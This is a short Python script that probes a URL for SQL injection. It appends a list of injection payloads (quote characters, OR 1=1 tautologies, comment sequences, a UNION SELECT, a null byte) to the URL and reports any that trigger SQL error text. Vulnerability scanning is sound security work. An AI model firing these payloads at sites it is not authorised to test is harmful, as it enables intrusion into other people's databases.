import requests

def check_sql_injection(url):
    payloads = [
        "'",       # Single quote payload
        "''",      # Double single quotes payload
        "`",       # Backtick payload
        "``",      # Double backticks payload
        ",",       # Comma payload
        '"',       # Double quote payload
        '""',      # Double double quotes payload
        "/",       # Forward slash payload
        "//",      # Double forward slashes payload
        "\\",      # Backslash payload
        "\\\\",    # Double backslashes payload
        ";",       # Semicolon payload
        "' or \"",  # Quote in OR condition payload
        "-- or #", # Comment payload
        "' OR '1", # Tautology payload
        "' OR 1 -- -", # Tautology with comment payload
        '" OR "" = "', # Tautology with double quotes payload
        '" OR 1 = 1 -- -', # Tautology with double quotes and comment payload
        "' OR '' = '", # Tautology with double single quotes payload
        "'='",     # Equal payload
        "'LIKE'",  # LIKE operator payload
        "'=0--+",  # Equal with comments payload
        " OR 1=1", # Always true condition payload
        "' OR 'x'='x", # Tautology with comparison payload
        "' AND id IS NULL; --", # Payload with NULL condition
        "'''''''''''''UNION SELECT '2", # Union select payload
        "%00"      # Null byte payload
        # Add more payloads here based on different SQL injection techniques
    ]
    
    vulnerabilities = []
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        
        if "SQL syntax" in response.text:
            vulnerabilities.append(payload)
    
    if vulnerabilities:
        message = "SQL injection vulnerabilities detected with payloads: {}".format(", ".join(vulnerabilities))
        severity = len(vulnerabilities) * 2  # Arbitrary severity calculation
        return message, severity
    
    return "No SQL injection vulnerabilities detected.", 1
    pass